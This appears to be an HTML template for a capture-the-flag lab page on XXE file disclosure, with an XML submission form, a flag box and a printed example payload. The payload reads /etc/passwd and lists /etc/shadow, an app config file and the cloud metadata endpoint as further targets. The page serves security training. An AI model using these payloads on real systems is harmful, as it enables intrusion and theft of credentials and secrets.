<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/xxe"><i class="fas fa-flask"></i> XXE Labs</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>📄 Basic XXE - File Disclosure</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span><span class="lab-tag points"><i class="fas fa-star"></i> 30 pts</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>The XML parser accepts DTD declarations with external entities. Read /etc/passwd from the server using an XXE payload.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> XML Parser</h2>
      <div class="vulnerable-form">
        <label>Submit XML (send as text/plain):</label>
        <textarea id="xxeInput" rows="8" placeholder="Enter XML here...">&lt;?xml version="1.0"?&gt;
&lt;note&gt;
  &lt;to&gt;Admin&lt;/to&gt;
  &lt;body&gt;Hello&lt;/body&gt;
&lt;/note&gt;</textarea>
        <button onclick="submitXXE()" class="btn">Parse XML</button>
      </div>
      <div id="xxeResult" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">XXE Payload:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;note&gt;
  &lt;to&gt;Admin&lt;/to&gt;
  &lt;body&gt;&amp;xxe;&lt;/body&gt;
&lt;/note&gt;

Other targets:
- file:///etc/shadow
- file:///app/config.js
- http://169.254.169.254/latest/meta-data/ (SSRF via XXE)</div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('xxe-basic','flagInput_xxe','flagResult_xxe'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_xxe" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_xxe" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function submitXXE() {
      const xml = document.getElementById('xxeInput').value;
      const res = await fetch('/labs/xxe/basic/parse', { method:'POST', headers:{'Content-Type':'text/plain'}, body:xml });
      document.getElementById('xxeResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
    }
  </script>
</body>
</html>
